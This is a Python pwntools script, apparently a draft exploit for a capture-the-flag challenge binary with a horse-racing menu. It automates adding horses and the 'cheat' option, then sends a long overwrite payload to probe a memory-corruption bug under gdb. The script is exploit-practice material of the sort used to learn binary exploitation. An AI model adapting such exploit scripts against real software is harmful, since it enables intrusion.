from pwn import *

ELF("./chall")

#p = process("./chall")

p = gdb.debug("./chall")

def gen_random_name(length):
    length = int(length)
    horse_name = bytes(''.join(random.choices(string.ascii_lowercase, k=length)), 'ascii')
    return horse_name

def add_horse(index, length):
    p.sendline(b'1')
    p.sendline(index)
    p.sendline(length)
    p.sendline(gen_random_name(length))

def remove_horse(index):
    p.sendline(b'2')
    p.sendline(index)

def race():
    p.sendline(b'3')

def exit_program():
    p.sendline(b'4')

def cheat(old_idx, new_idx):
    # considering we already added a horse
    p.sendline(b'0')
    p.sendline(old_idx)
    p.sendline(gen_random_name(16))
    p.sendline(new_idx)

def test_cheat_overwrite():
    var = b'5' * 8353
    var += b'0' * 8
    p.sendline(var)

# add n horses of length 16
'''
for _ in range(5):
    idx= bytes(str(_), 'ascii')
    horse_name = bytes(''.join(random.choices(string.ascii_lowercase, k=16)), 'ascii')
    add_horse(idx, b'16', horse_name)
'''
#race()

add_horse(b'0', b'16')
p.recvline()
add_horse(b'1', b'16')
p.recvline()
add_horse(b'2', b'16')
p.recvline()
add_horse(b'3', b'16')
p.recvline()
add_horse(b'4', b'16')
p.recvline()
cheat(b'0', b'5')
test_cheat_overwrite()
#cheat(b'0', b'4')
#test_cheat_overwrite()

p.interactive()
